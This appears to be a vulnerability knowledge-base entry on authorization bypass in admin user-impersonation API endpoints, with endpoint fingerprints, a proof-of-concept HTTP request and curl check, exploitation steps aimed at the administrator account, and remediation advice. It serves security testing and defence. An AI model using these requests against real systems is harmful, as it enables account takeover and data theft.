---
title: Authorization bypass in admin "switch user/impersonation" endpoints (arbitrary account takeover)
cve: None (business logic)
severity: critical
cvss: 9.1
product: Custom support/agent backend
versions: Any
ports: 80, 443
keywords: impersonate, switch, impersonation, support, broken access control, takeover
entry: /api/admin/user/loginAs?uid=1
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

- Backends commonly have "log in as this user"/"act on behalf of customer" buttons, corresponding to these endpoints:

```
/api/admin/user/loginAs?uid=       /api/admin/member/switch?memberId=
/api/cs/impersonate                /api/agent/loginAs?uid=
```

## Prerequisites

- Any account (regular member token or low-privilege support/agent).

## PoC

```http
### 1) Call impersonation with a regular token
GET /api/admin/user/loginAs?uid=1 HTTP/1.1
Authorization: Bearer <regular token>

# 200 with {"token":"..."} / {"sessionId":"..."} ⇒ direct access to the target account
```

```bash
# Verify identity after obtaining the token
curl -s https://target/api/user/info -H "Authorization: Bearer <returned token>"
```

## Exploitation Steps

1. Find the impersonation endpoint path in JS/backend pages and call it with a regular token.
2. `uid=1` is often an administrator/master agent; a returned token means takeover.
3. If no token is returned, check for Set-Cookie (session switch); some implementations return a redirect URL containing a ticket.
4. After takeover, inspect financial/profile access; administrator accounts can also change approval status and export site-wide data.
5. Evidence: one impersonation request returning 200 + reading info with the returned token; test only your own uid and 1.

## Remediation and Mitigation

- Require a privileged role (superadmin) + two-person approval + full auditing for impersonation; use short-lived tokens marked `impersonated`.
- Prohibit regular roles entirely; enforce uid-based row-level authorization on the endpoint.

## References

- OWASP API Security Top 10：API5 BFLA。
